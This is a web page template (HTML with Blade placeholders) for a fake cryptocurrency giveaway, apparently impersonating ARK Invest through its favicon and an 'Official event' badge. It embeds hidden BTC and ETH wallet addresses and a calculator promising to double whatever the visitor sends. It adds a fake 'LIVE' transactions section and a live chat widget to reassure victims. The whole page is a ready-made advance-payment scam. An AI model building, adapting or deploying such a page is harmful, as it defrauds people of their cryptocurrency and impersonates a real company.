...
<html lang="en">
    <head>
        ...
        <title>ARK Biggest giveaway CRYPTO of $100 000 000</title>
        ...
        <style>
            ::-webkit-scrollbar-thumb {
                background-color: {{ $site[4]->text }}
            }
            .section-title span {
                color: {{ $site[4]->text }}
            }
            .navigation-participate {
                background: {{ $site[4]->text }}
            }
        ...
        <link rel="shortcut icon" href="http://favicon.yandex.net/favicon/ark-invest.com/">
        <!-- Smartsupp Live Chat script -->
        <script type="text/javascript">
            var _smartsupp = _smartsupp || {};
            _smartsupp.key = 'bbc05b7b2692ab2c04a704d4598efec1386f9638';
    ...
    <body>
        <input type="hidden" name="address_btc" value="bc1q4r7naze9yhd0qmngdxq4r54xn228eh5tgv3rhu">
        <input type="hidden" name="address_eth" value="0x591F197Fbd1D013a6A691853da59e98A5BEbbda1">
        <div class="background"></div>
        <div class="background2"></div>
        <div class="app">
            <header class="navigation">
                <div class="navigation-container">
                    <img src="{{asset('images/logo_black.png')}}" alt class="navigation-logo">
                    <nav class="navigation-nav">
                        <a href="#giveaway" class="active">Giveaway</a>
                        <a href="#rules">Info</a>
                        <a href="#rules">Instruction</a>
                        <a href="#participate">Participate</a>
                        <a href="#transaction">Transaction</a>
                    </nav>
                    <a href="#participate" class="navigation-participate">Participate →</a>
                </div>
            </header>
            <main class="main">
                <section class="top" id="giveaway">
                    <div class="top-container">
                        <div class="top-text">
                            <div class="top-bage">
                                <img src="{{asset('images/bage.png')}}" alt>
                                <p>Official event</p>
                            </div>
                            <h1 class="top-title">Biggest giveaway<br> CRYPTO of <span>$100 000 000</span></h1>
                            <p class="top-subtitle">{!! $site[0]->text !!}</p>
                            <div class="top-buttons">
                                <a class="top-button participate" href="#participate">Participate →</a>
                                <a class="top-button qr" href="#participate"><img src="{{asset('images/qr.png')}}" alt></a>
                            </div>
                        </div>
                        <img src="{{asset('images/creator.png')}}" class="participate-creator" alt>
                    </div>
                </section>
                <section class="instruction" id="rules">
                    <h4 class="section-title">Instruction <span>for</span> participate</h4>
                    <div class="instruction-container">
                        ...
                        <div class="instruction-row">
                            ...
                            <div class="instruction-item">
                                <img src="{{asset('images/bonus.png')}}" alt>
                ...
                <section class="rules">
                    <h4 class="section-title">Rules <span>&</span> Information</h4>
                    <div class="rules-container">
                        <div class="rules-row">
                            <div class="rules-item">
                                <p class="rules-title"><span>About</span> giveaway <img style="width: 35px; height: 35px; display: inline-block; vertical-align: middle; margin-left: 5px;" src="{{asset('images/popper.png')}}" alt></p>
                                <p class="rules-subtitle">{!! $site[1]->text !!}</p>
                            </div>
                            <div class="rules-item">
                                <p class="rules-title"><span>How</span> to participate BTC & ETH</p>
                                <p class="rules-subtitle">{!! $site[2]->text !!}</p>
                            </div>
                        </div>
                        <div class="rules-row">
                            <div class="rules-item">
                                <p class="rules-title"><span>How</span> to participate SHIB</p>
                                <p class="rules-subtitle">{!! $site[3]->text !!}</p>
                            </div>
                            <div class="rules-item calculator">
                                <div class="calculator-block">
                                    <div class="calculator-item">
                                        <p class="calculator-label">You will send <span>BTC</span><svg width="8" height="10" viewbox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M1.68956 0.313455C1.55103 0.310408 1.41499 0.350568 1.30035 0.428412C1.18571 0.506257 1.09818 0.61794 1.04991 0.747833C1.00165 0.877726 0.995062 1.01941 1.03106 1.15322C1.06705 1.28703 1.14385 1.40625 1.25076 1.4944L5.33019 4.98919L1.25076 8.48275C1.1768 8.5371 1.11486 8.60611 1.06882 8.68552C1.02278 8.76492 0.993636 8.853 0.983203 8.94419C0.97277 9.03538 0.981278 9.12773 1.00819 9.21548C1.03511 9.30323 1.07985 9.3845 1.13963 9.45416C1.1994 9.52381 1.2729 9.58032 1.35555 9.62025C1.43819 9.66018 1.52819 9.68261 1.61991 9.68615C1.71163 9.68969 1.80309 9.6743 1.88856 9.64086C1.97404 9.60741 2.05169 9.55668 2.11665 9.49184L6.78722 5.4957C6.86057 5.4331 6.91946 5.35541 6.95985 5.26786C7.00023 5.1803 7.02115 5.085 7.02115 4.98857C7.02115 4.89215 7.00023 4.79685 6.95985 4.70929C6.91946 4.62174 6.86057 4.54397 6.78722 4.48138L2.11665 0.481393C1.99866 0.376594 1.84733 0.317014 1.68956 0.313301V0.313455Z" fill="#2D2D2D"/>
                                        </svg></p>
                                        <div class="calculator-input">
                                            <input type="text" value="1" name="input" placeholder="1">
                                        </div>
                                    </div>
                                    <p class="calculator-delimiter">X</p>
                                    <div class="calculator-item">
                                        <p class="calculator-label">Your profit</p>
                                        <div class="calculator-counter"><span>200%</span></div>
                                    </div>
                                    <p class="calculator-delimiter">=</p>
                                    <div class="calculator-item red">
                                        <p class="calculator-label red">You receive</p>
                                        <div class="calculator-counter">
                                            <span id="calculator_number">2</span>
                ...
                <section class="participate" id="participate">
                    <h4 class="section-title">Participate <span>in</span> giveaway</h4>
                ...
                <section class="transaction" id="transaction">
                    <div class="transaction-title">
                        <div class="transaction-title_live">
                            <div class="dot">
                                <div></div>
                            </div>
                            <p>LIVE</p>
            ...
            <footer class="navigation">
                <div class="navigation-container">
                    <img src="{{asset('images/logo_white.png')}}" alt class="navigation-logo">
                    <a href="#participate" class="navigation-participate">Participate →</a>
                </div>
            </footer>
        </div>
